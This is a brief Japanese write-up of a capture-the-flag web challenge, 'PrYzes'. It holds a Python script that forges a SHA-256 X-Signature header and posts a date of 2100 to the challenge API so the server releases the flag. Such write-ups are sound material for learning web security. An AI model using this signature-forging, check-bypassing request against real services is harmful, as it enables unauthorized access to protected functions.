## PrYzes
dateが2100以上でなければいけないことよりリクエストを送信するコードを作成

```
import requests
import hashlib
import json

url = "http://web.heroctf.fr:5000/api/prizes"
date_str = "01/01/2100"  # フラグ取得の条件を満たす日付

data = {
    "date": date_str
}

# SHA-256 署名の生成
json_data = json.dumps(data)
signature = hashlib.sha256(json_data.encode("utf-8")).hexdigest()
headers = {
    "Content-Type": "application/json",
    "X-Signature": signature
}

# リクエスト送信
response = requests.post(url, headers=headers, json=data)

# レスポンスの確認
print(response.json())

```
